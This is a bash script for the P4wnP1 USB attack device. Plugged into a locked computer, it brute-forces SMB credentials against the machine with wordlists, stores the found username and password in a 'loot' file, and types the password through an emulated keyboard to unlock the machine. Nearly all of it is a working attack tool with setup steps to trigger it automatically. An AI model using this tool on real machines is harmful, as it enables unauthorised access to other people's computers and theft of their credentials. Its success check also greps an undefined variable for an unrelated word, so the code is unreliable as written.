#!/bin/bash
export GOPATH="/root/go"
export PATH=/bin/lscript:/bin/lscript:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/go/bin

# P4wnP1 SMBrute
# Author: Mohamed A. Baset aka @SymbianSyMoh

# Setup
# 1. Get and install the "godance" go script by executing "go get github.com/joohoi/godance"
# 2. Set the proper variables paths
password_process_file="/usr/local/P4wnP1/scripts/ppf.txt"
password_loot_file="/usr/local/P4wnP1/loot/credentials.txt"
unlock_hid_script="/usr/local/P4wnP1/HIDScripts/hid_enter_login_password.js"
user_bruteforce_list="/usr/local/P4wnP1/wordlists/user.txt"
pass_bruteforce_list="/usr/local/P4wnP1/wordlists/pass2.txt"
# 3. Put this script under /usr/local/P4wnP1/scripts/P4wnP1-GoSMBCredsBruteforceUnlock.sh
# 4. Create a trigger action with those properties:
	# Enabled: on
	# One Shot: on
	# Trigger: DHCP lease issued
	# Action: run a bash script
	# Script path: P4wnP1-GoSMBCredsBruteforceUnlock.sh
# 5. Save the configuration and set it in a master template and set it as "Startup Master Template"
# 6. Plug the P4wnP1 in a locked computer, once the DHCP lease offered it will perform SMB bruteforce attack and once succeded it will fire HID script to enter the password and unlock the machine.

#Preparation
mkdir /usr/local/P4wnP1/loot 2> /dev/null
rm $unlock_hid_script 2> /dev/null
rm $password_process_file 2> /dev/null

cd /root/go/bin/
./godance -h 172.16.0.2 -u $user_bruteforce_list -w $pass_bruteforce_list -d WORKGROUP -t 500 > $password_process_file

if grep -q "voice" $passfile; then
echo ""
P4wnP1_cli led -b 150
echo "[*] Password found!"
user=$(cat $password_process_file | grep "Username: " | cut -d "/" -f 3 | cut -d " " -f 3)
pass=$(cat $password_process_file | grep "Username: " | cut -d "/" -f 5 | cut -d " " -f 3)
echo "[*] Storing found credentials..."
echo "User:$user - Pass:$pass" >> $password_loot_file
echo "[*] Preparing unlocking script..."
echo "layout('en')" > $unlock_hid_script
echo "press(\"ESC\");" >> $unlock_hid_script
echo "delay(2000)" >> $unlock_hid_script
echo "type(\"$pass\n\")" >> $unlock_hid_script
echo "[*] Unlocking target machine..."
P4wnP1_cli hid run $unlock_hid_script
echo "[*] Unlocked successfully!"
else
echo ""
echo "[*] Password cannot be found in the wordlist!"
P4wnP1_cli led -b 0
fi

# Performance: Fast, processed 1835 password guessing in 47.35 seconds!
